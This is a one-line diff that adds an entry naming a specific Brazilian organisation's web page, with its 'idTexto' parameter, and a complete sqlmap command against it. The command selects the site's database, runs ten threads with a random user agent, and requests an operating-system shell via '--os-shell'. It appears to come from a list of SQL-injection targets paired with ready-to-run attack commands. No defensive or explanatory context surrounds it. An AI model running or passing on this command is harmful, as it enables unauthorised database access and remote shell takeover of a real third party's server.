@@ -1,0 +1,1 @@
+https://fehoesp360.org.br/conteudo.asp?idTexto=104 (GET)  # sqlmap.py -u https://fehoesp360.org.br/conteudo.asp?idTexto=104 -D fehoesp360 --threads 10 -v3 --random-agent --os-shell
